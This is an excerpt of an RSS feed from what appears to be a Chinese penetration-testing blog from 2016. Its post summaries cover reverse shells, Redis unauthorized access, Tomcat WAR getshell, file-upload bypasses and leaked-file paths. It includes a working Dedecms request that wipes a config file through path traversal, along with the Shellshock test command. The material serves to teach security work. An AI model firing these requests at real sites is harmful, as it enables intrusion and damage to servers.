&lt;/li>
&lt;li>
&lt;p>找可写目录
&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_find_wirteable_dir.png" alt="Windows系统漏洞提权-找可写目录">&lt;/p></description></item><item><title>反弹 shell 小结</title><link>https://wyb0.cn/posts/2016/reverse-shell/</link><pubDate>Sat, 06 Aug 2016 08:36:53 +0000</pubDate><guid>https://wyb0.cn/posts/2016/reverse-shell/</guid><description>&lt;p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令&lt;/p></description></item><item><title>Dedecms 远程写文件漏洞</title><link>https://wyb0.cn/posts/2016/dedecms-remote-write-file-vulnerability/</link><pubDate>Fri, 05 Aug 2016 23:29:20 +0000</pubDate><guid>https://wyb0.cn/posts/2016/dedecms-remote-write-file-vulnerability/</guid><description>&lt;h3 id="0x00-关于漏洞">0x00 关于漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用条件">0x01 利用条件&lt;/h3>
&lt;pre tabindex="0">&lt;code>dedecms版本为20150618之前的 
安装目录install下的index.php.bak文件未被删除
&lt;/code>&lt;/pre>&lt;h3 id="0x02-实例">0x02 实例&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>查看cms版本
&lt;img src="https://wyb0.cn/img/post/dedecms_before_20150617_check_version.png" alt="查看织梦cms版本">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>清空文件&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">http&lt;/span>&lt;span style="color:#f92672">://&lt;/span>&lt;span style="color:#a6e22e">www&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">xxxx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">com&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">install&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">bak&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#a6e22e">step&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">insLockfile&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">s_lang&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">install_demo_name&lt;/span>&lt;span style="color:#f92672">=../&lt;/span>&lt;span style="color:#a6e22e">data&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">admin&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">config_update&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">访问上面的链接会使服务器到http&lt;/span>&lt;span style="color:#f92672">://&lt;/span>&lt;span style="color:#a6e22e">updatenew&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">dedecms&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">com&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">base&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">v57&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">dedecms&lt;/span>&lt;span style="color:#f92672">/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">demodata&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">txt中读取内容写入到config_update&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php，但demodata&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">txt为空，&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">所以就清空了config_update&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://wyb0.cn/img/post/dedecms_before_20150617_clear_config_update.png" alt="清空文件config_update">&lt;/p></description></item><item><title>Redis 未授权访问漏洞</title><link>https://wyb0.cn/posts/2016/redis-unauthorized-access/</link><pubDate>Thu, 04 Aug 2016 15:52:26 +0000</pubDate><guid>https://wyb0.cn/posts/2016/redis-unauthorized-access/</guid><description>&lt;h3 id="0x00-redis的未授权访问">0x00 Redis的未授权访问&lt;/h3>
&lt;p>若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。&lt;/p>
&lt;p>若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。&lt;/p></description></item><item><title>一次存储型 XSS 利用实例</title><link>https://wyb0.cn/posts/2016/redis-bisis-use/</link><pubDate>Wed, 03 Aug 2016 11:02:20 +0000</pubDate><guid>https://wyb0.cn/posts/2016/redis-bisis-use/</guid><description>&lt;h3 id="0x00-关于redis">0x00 关于Redis&lt;/h3>
&lt;pre tabindex="0">&lt;code>Redis和MySQL这种关系型数据库不一样，它是非关系型数据库，是日志型、Key-Value数据库，
实现了master-slave(主从)同步,数据都是缓存在内存中的,所以可高速读写,但存储成本较高,
不适合做海量数据存储。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-安装">0x01 安装&lt;/h3>
&lt;ul>
&lt;li>Linux下安装Redis
可在http://download.redis.io/releases/ 下载&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ cd /opt
$ wget http://download.redis.io/releases/redis-3.2.3.tar.gz
$ tar -zxvf redis-3.2.3.tar.gz
$ cd redis-3.2.3
$ make
$ make install
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Windows下安装Redis
下载：&lt;a href="https://github.com/MSOpenTech/redis/releases" target="_blank">点此下载&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>安装后添加环境变量&lt;/p></description></item><item><title>Tomcat 部署 War 包 getshell</title><link>https://wyb0.cn/posts/2016/tomcat-deploy-war-package-to-getshell/</link><pubDate>Tue, 02 Aug 2016 22:30:13 +0000</pubDate><guid>https://wyb0.cn/posts/2016/tomcat-deploy-war-package-to-getshell/</guid><description>&lt;h3 id="0x00-关于-war-包">0x00 关于 War 包&lt;/h3>
&lt;pre tabindex="0">&lt;code>War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
服务器启动时,War包也会随之被解压后自动部署。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-上传-war-包-getshell">0x01 上传 War 包 GetShell&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>找到后台猜密码然后登录
&lt;img src="https://wyb0.cn/img/post/tomcat_vul_background.png" alt="70">
&lt;img src="https://wyb0.cn/img/post/tomcat_vul_login.png" alt="40">
&lt;img src="https://wyb0.cn/img/post/tomcat_vul_war_login_success.png" alt="30">&lt;/p></description></item><item><title>CGI 与 FastCGI 与 PHP-FPM</title><link>https://wyb0.cn/posts/2016/cgi-and-fastcgi-and-php-fpm/</link><pubDate>Tue, 02 Aug 2016 10:45:14 +0000</pubDate><guid>https://wyb0.cn/posts/2016/cgi-and-fastcgi-and-php-fpm/</guid><description>&lt;h3 id="0x01-cgi协议">0x01 CGI协议&lt;/h3>
&lt;p>中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议&lt;/p></description></item><item><title>BurpSuite 的 Intruder 模块</title><link>https://wyb0.cn/posts/2016/burpsuite-intruder-module/</link><pubDate>Mon, 01 Aug 2016 09:17:38 +0000</pubDate><guid>https://wyb0.cn/posts/2016/burpsuite-intruder-module/</guid><description>&lt;h3 id="0x00-示例一">0x00 示例一&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_caught.png" alt="burpsuite抓包发送给intruder模">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_attack_type1.png" alt="burpsuite的intruder模块的攻击类型1">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_attack_type2.png" alt="burpsuite的intruder模块的攻击类型2">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_payload_set.png" alt="burpsuite的intruder模块payload设置">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_payload_set_variable1.png" alt="burpsuite的intruder模块payload设置变量1">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_payload_set_variable2.png" alt="burpsuite的intruder模块payload设置变量2">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_payload_processing_rule.png" alt="burpsuite的intruder模块payload设置的特殊处理">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_start_attack.png" alt="burpsuite的intruder模块开始攻击">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_attack_interface.png" alt="burpsuite的intruder攻击界面">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_screening_attack_results.png" alt="burpsuite的intruder筛选攻击结果">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder_attack_results.png" alt="burpsuite的intruder筛选后的攻击结果">&lt;/p>
&lt;h3 id="0x01-示例二">0x01 示例二&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder1.png" alt="burpsuite的intruder1">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder2.png" alt="burpsuite的intruder2">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder3.png" alt="burpsuite的intruder3">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder4.png" alt="burpsuite的intruder4">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder5.png" alt="burpsuite的intruder5">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder6.png" alt="burpsuite的intruder6">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder7.png" alt="burpsuite的intruder7">
&lt;img src="https://wyb0.cn/img/post/burpsuite_intruder8.png" alt="burpsuite的intruder8">&lt;/p></description></item><item><title>逻辑漏洞</title><link>https://wyb0.cn/posts/2016/logical-loophole/</link><pubDate>Sun, 31 Jul 2016 18:43:49 +0000</pubDate><guid>https://wyb0.cn/posts/2016/logical-loophole/</guid><description>&lt;h3 id="0x00-逻辑漏洞">0x00 逻辑漏洞&lt;/h3>
&lt;p>逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。
这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。&lt;/p>
&lt;h3 id="0x01-密码找回漏洞">0x01 密码找回漏洞&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>测试流程&lt;/p></description></item><item><title>敏感信息泄露</title><link>https://wyb0.cn/posts/2016/sensitive-information-leakage/</link><pubDate>Thu, 28 Jul 2016 22:42:58 +0000</pubDate><guid>https://wyb0.cn/posts/2016/sensitive-information-leakage/</guid><description>&lt;h3 id="0x00-软件敏感信息">0x00 软件敏感信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>* 操作系统版本
 可用namp扫描得知
* 中间件的类型、版本
 http返回头
 404报错页面
 使用工具(如whatweb)
* Web程序(cms类型及版本、敏感文件)
 可用whatweb、cms_identify
&lt;/code>&lt;/pre>&lt;h3 id="0x01-web敏感信息">0x01 Web敏感信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>* phpinfo()信息泄露
 http://[ip]/test.php和http://[ip]/phpinfo.php
* 测试页面泄露在外网
 test.cgi、phpinfo.php、info.php等
* 编辑器备份文件泄露在外网
 http://[ip]/.test.php.swp
 http://[ip]/test.php.bak
 http://[ip]/test.jsp.old
 http://[ip]/cgi~
 常见编辑器备份后缀
* 版本管理工具(如git)文件信息泄露
 http://[ip]/.git/config
 http://[ip]/CVS/Entriesp
 http://[ip]/.svn/entriesp
* HTTP认证泄露漏洞
 http://[ip]/basic/index.php
 Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码
* 管理后台地址泄露
 http://[ip]/login.php
 http://[ip]/admin.php
 http://[ip]/manager.php
 http://[ip]/admin_login.php
* 泄露员工邮箱、分机号码
 泄露邮箱及分机号码可被社工，也可生成字典
* 错误页面暴漏信息
 mysql错误、php错误、暴漏cms版本等
* 探针文件
* robots.txt
* phpMyAdmin
* 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等)
* 其他
&lt;/code>&lt;/pre>&lt;h3 id="0x02-网络信息泄露">0x02 网络信息泄露&lt;/h3>
&lt;pre tabindex="0">&lt;code>* DNS域传送漏洞
* 运维监控系统弱口令、网络拓扑泄露
 zabbix弱口令、zabbix sql注入等
&lt;/code>&lt;/pre>&lt;h3 id="0x03-第三方软件应用">0x03 第三方软件应用&lt;/h3>
&lt;pre tabindex="0">&lt;code>* github上源码、数据库、邮箱密码泄露
 搜类似：smtp 163 password关键字
* 百度网盘被员工不小心上传敏感文件
* QQ群被员工不小心上传敏感文件
&lt;/code>&lt;/pre>&lt;h3 id="0x04-敏感信息搜集工具">0x04 敏感信息搜集工具&lt;/h3>
&lt;pre tabindex="0">&lt;code>https://github.com/ring04h/weakﬁlescan
https://github.com/lijiejie/BBScan
whatweb
dnsenum
github
&lt;/code>&lt;/pre>&lt;h3 id="0x05-示例">0x05 示例&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/sensitive_information_leakage.png" alt="敏感信息泄露">&lt;/p></description></item><item><title>任意文件查看与下载漏洞</title><link>https://wyb0.cn/posts/2016/any-file-view-and-download-vulnerability/</link><pubDate>Wed, 27 Jul 2016 23:25:18 +0000</pubDate><guid>https://wyb0.cn/posts/2016/any-file-view-and-download-vulnerability/</guid><description>&lt;h3 id="0x00-漏洞介绍">0x00 漏洞介绍&lt;/h3>
&lt;p>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞&lt;/p></description></item><item><title>文件包含漏洞</title><link>https://wyb0.cn/posts/2016/file-include-vulnerabilities/</link><pubDate>Tue, 26 Jul 2016 09:24:22 +0000</pubDate><guid>https://wyb0.cn/posts/2016/file-include-vulnerabilities/</guid><description>&lt;p>环境：phpStudy 2016、DVWA v1.10&lt;/p>
&lt;h3 id="0x00-文件包含">0x00 文件包含&lt;/h3>
&lt;p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。&lt;/p></description></item><item><title>代码执行漏洞(一)</title><link>https://wyb0.cn/posts/2016/code-execution-vulnerabilities/</link><pubDate>Mon, 25 Jul 2016 22:32:51 +0000</pubDate><guid>https://wyb0.cn/posts/2016/code-execution-vulnerabilities/</guid><description>&lt;h3 id="0x00-代码执行">0x00 代码执行&lt;/h3>
&lt;p>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。&lt;/p></description></item><item><title>Windows 下用 Proxifier 实现全局代理</title><link>https://wyb0.cn/posts/2016/windows-proxifier-implement-global-proxy/</link><pubDate>Sun, 24 Jul 2016 21:33:59 +0000</pubDate><guid>https://wyb0.cn/posts/2016/windows-proxifier-implement-global-proxy/</guid><description>&lt;h3 id="0x00-环境">0x00 环境&lt;/h3>
&lt;p>在windows下用Shadowsocks和Proxifier实现全局代理：&lt;/p>
&lt;pre tabindex="0">&lt;code>System：Windows10 Pro x64
Shadowsocks：Shadowsocks v2.5.2.0 
Proxifier：Proxifier Portable Edition v3.29
&lt;/code>&lt;/pre>&lt;h3 id="0x01-配置shadowsocks">0x01 配置Shadowsocks&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/global_agent_set_shadowsocks.png" alt="Windows下实现全局代理-设置shadowsocks">&lt;/p></description></item><item><title>命令执行漏洞</title><link>https://wyb0.cn/posts/2016/command-execution-vulnerabilities/</link><pubDate>Sun, 24 Jul 2016 14:32:51 +0000</pubDate><guid>https://wyb0.cn/posts/2016/command-execution-vulnerabilities/</guid><description>&lt;h3 id="0x00-命令执行">0x00 命令执行&lt;/h3>
&lt;pre tabindex="0">&lt;code>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用条件">0x01 利用条件&lt;/h3>
&lt;ol>
&lt;li>应用调用执行系统命令的函数&lt;/li>
&lt;li>将用户输入作为系统命令的参数拼接到了命令行中&lt;/li>
&lt;li>没有对用户输入进行过滤或过滤不严&lt;/li>
&lt;/ol>
&lt;h3 id="0x02-漏洞分类">0x02 漏洞分类&lt;/h3>
&lt;ol>
&lt;li>代码层过滤不严&lt;br>
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：&lt;br>
system(&amp;quot;/bin/program --arg $arg&amp;quot;);&lt;/li>
&lt;li>系统的漏洞造成命令执行&lt;br>
bash破壳漏洞(CVE-2014-6271)&lt;br>
执行&lt;code>env x='() { :;}; echo vulnerable' bash -c &amp;quot;echo this is a test&amp;quot;&lt;/code>后&lt;br>
若输出vulnerable则证明存在漏洞&lt;/li>
&lt;li>调用的第三方组件存在代码执行漏洞&lt;br>
如WordPress中用来处理图片的ImageMagick组件&lt;br>
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)&lt;br>
ThinkPHP命令执行&lt;/li>
&lt;/ol>
&lt;h3 id="0x03-漏洞危害">0x03 漏洞危害&lt;/h3>
&lt;ol>
&lt;li>继承Web服务程序的权限去执行系统命令或读写文件&lt;/li>
&lt;li>反弹shell&lt;/li>
&lt;li>控制整个网站甚至控制服务器&lt;/li>
&lt;li>进一步内网渗透&lt;/li>
&lt;li>等等&lt;/li>
&lt;/ol>
&lt;h3 id="0x04-漏洞挖掘">0x04 漏洞挖掘&lt;/h3>
&lt;p>可以google hacking&lt;br>
尝试：filetype:action或filetype:do来找struts2&lt;/p></description></item><item><title>文件上传之文本编辑器上传漏洞</title><link>https://wyb0.cn/posts/2016/file-upload-editor-upload-vulnerability/</link><pubDate>Thu, 21 Jul 2016 15:11:29 +0000</pubDate><guid>https://wyb0.cn/posts/2016/file-upload-editor-upload-vulnerability/</guid><description>&lt;h3 id="0x00-文本编辑器">0x00 文本编辑器&lt;/h3>
&lt;p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。&lt;/p></description></item><item><title>文件上传漏洞常见绕过手法</title><link>https://wyb0.cn/posts/2016/file-upload-simple-to-bypass/</link><pubDate>Wed, 20 Jul 2016 17:04:44 +0000</pubDate><guid>https://wyb0.cn/posts/2016/file-upload-simple-to-bypass/</guid><description>&lt;h3 id="0x00-一般防止上传漏洞手法">0x00 一般防止上传漏洞手法&lt;/h3>
&lt;pre tabindex="0">&lt;code>1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证
 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少
 //服务器开销，而服务端验证才可以真正防御攻击者。 
2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法
&lt;/code>&lt;/pre>&lt;h3 id="0x01-客户端检测">0x01 客户端检测&lt;/h3>
&lt;p>客户端验证代码形如下：&lt;/p></description></item><item><title>文件上传漏洞与文件解析漏洞</title><link>https://wyb0.cn/posts/2016/file-upload-and-file-parse-vuln/</link><pubDate>Wed, 20 Jul 2016 11:30:53 +0000</pubDate><guid>https://wyb0.cn/posts/2016/file-upload-and-file-parse-vuln/</guid><description>&lt;h3 id="0x00-文件上传漏洞">0x00 文件上传漏洞&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 上传后得到的权限&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1. 后台权限：登陆了后台，可以进行一些操作、配置
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2. 网站权限：获得了webshell，可以进行查看源代码等操作
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3. 服务器权限：可以对服务器进行任意操作
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-文件上传漏洞分类">0x01 文件上传漏洞分类&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 配置不当可直接上传shell
 HTTP的PUT方法开启了
2. 文件解析漏洞导致文件执行
 Web容器解析漏洞
3. 本地文件上传限制被绕过
 BurpSuite抓包修改即可绕过
4. 服务端过滤不严或被绕过
 使用了黑名单过滤
5. 文件路径截断上传
 00截断等
6. 开源编辑器上传漏洞
 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞
&lt;/code>&lt;/pre>&lt;h3 id="0x02-文件上传漏洞利用条件">0x02 文件上传漏洞利用条件&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径
2. 其次,用户能从web访问这个文件
3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败
&lt;/code>&lt;/pre>&lt;h3 id="0x03-文件上传漏洞挖掘">0x03 文件上传漏洞挖掘&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 查找上传点，如图片、附件、头像的上传等
2. 找类似upload的目录、类似upload.php的文件
3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等
&lt;/code>&lt;/pre>&lt;h3 id="0x04-常见可执行文件后缀">0x04 常见可执行文件后缀&lt;/h3>
&lt;pre tabindex="0">&lt;code>可用于绕过：
php php2 php3 php5 phtml
asp aspx ascx ashx cer asa
jsp jspx jspf
&lt;/code>&lt;/pre>&lt;h3 id="0x05-解析漏洞">0x05 解析漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>文件上传漏洞通常与Web容器的解析漏洞配合利用
常见Web容器有IIS、Nginx、Apache、Tomcat等
&lt;/code>&lt;/pre>&lt;h3 id="0x06-iis解析漏洞">0x06 IIS解析漏洞&lt;/h3>
&lt;p>IIS6.0在解析文件时存在以下两个解析漏洞&lt;/p></description></item><item><title>虚拟机下安装 vm-tools</title><link>https://wyb0.cn/posts/2016/vmware-install-vm-tools/</link><pubDate>Wed, 20 Jul 2016 08:30:53 +0000</pubDate><guid>https://wyb0.cn/posts/2016/vmware-install-vm-tools/</guid><description>&lt;p>vm-tools安装后可以在客户机和虚拟机间双向复制文件&lt;/p>
&lt;h3 id="0x00-安装">0x00 安装&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/vm_tools_mount_cd.png" alt="vm-tools挂载光盘">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/vm_tools_copy_and_unzip.png" alt="vm-tools拷贝并解压安装包">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/vm_tools_install.png" alt="vm-tools安装">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/vm_tools_install_complete.png" alt="vm-tools安装完成">&lt;/p>
&lt;h3 id="0x01-kali20">0x01 Kali2.0&lt;/h3>
&lt;p>一般安装的话按照上面的步骤即可安装成功，但是Kali2.0不行，可以用如下方法安装：
&lt;img src="https://wyb0.cn/img/post/vm_tools_kali2.0_install1.png" alt="vm-tools在Kali2.0下的安装1">&lt;/p></description></item><item><title>一次存储型 XSS 利用实例</title><link>https://wyb0.cn/posts/2016/recording-an-stored-xss/</link><pubDate>Sun, 17 Jul 2016 23:30:54 +0000</pubDate><guid>https://wyb0.cn/posts/2016/recording-an-stored-xss/</guid><description>&lt;p>首先感谢凯神的指导&lt;/p>
&lt;h3 id="0x00-注册账号">0x00 注册账号&lt;/h3>
&lt;p>先得到一个临时邮箱，然后注册账号
&lt;img src="https://wyb0.cn/img/post/xss_example_get_temporary_email.png" alt="65">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/xss_example_register.png" alt="35">&lt;/p>
&lt;h3 id="0x01-找输入输出点">0x01 找输入输出点&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/xss_example_add_topic.png" alt="40">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/xss_example_input_output_point.png" alt="80">&lt;/p>
&lt;h3 id="0x02-尝试构造payload">0x02 尝试构造payload&lt;/h3>
&lt;p>payload用如下的即可：&lt;/p></description></item><item><title>XSS 漏洞及其挖掘方法</title><link>https://wyb0.cn/posts/2016/xss-basis-and-use/</link><pubDate>Fri, 15 Jul 2016 10:30:54 +0000</pubDate><guid>https://wyb0.cn/posts/2016/xss-basis-and-use/</guid><description>&lt;h3 id="0x00-简介">0x00 简介&lt;/h3>
&lt;p>XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;quot;脚本&amp;quot;这两个字上，脚本主要有两个：JavaScript和ActionScript。&lt;br>
&lt;f>要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。&lt;/f>&lt;/p></description></item><item><title>Python 的 paramiko 模块</title><link>https://wyb0.cn/posts/2016/python-module-paramiko/</link><pubDate>Thu, 14 Jul 2016 15:24:11 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-module-paramiko/</guid><description>&lt;h3 id="0x00-安装">0x00 安装&lt;/h3>
&lt;p>直接pip install paramiko安装&lt;br>
或者去http://www.paramiko.org/ 下载&lt;/p>
&lt;h3 id="0x01-执行一条远程命令">0x01 执行一条远程命令&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#-*- coding:utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> paramiko
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#远程执行命令&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh &lt;span style="color:#f92672">=&lt;/span> paramiko&lt;span style="color:#f92672">.&lt;/span>SSHClient()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh&lt;span style="color:#f92672">.&lt;/span>set_missing_host_key_policy(paramiko&lt;span style="color:#f92672">.&lt;/span>AutoAddPolicy())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh&lt;span style="color:#f92672">.&lt;/span>connect(&lt;span style="color:#e6db74">&amp;#34;192.168.188.134&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">22&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;reber&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;123456&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh_session &lt;span style="color:#f92672">=&lt;/span> ssh&lt;span style="color:#f92672">.&lt;/span>get_transport()&lt;span style="color:#f92672">.&lt;/span>open_session()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
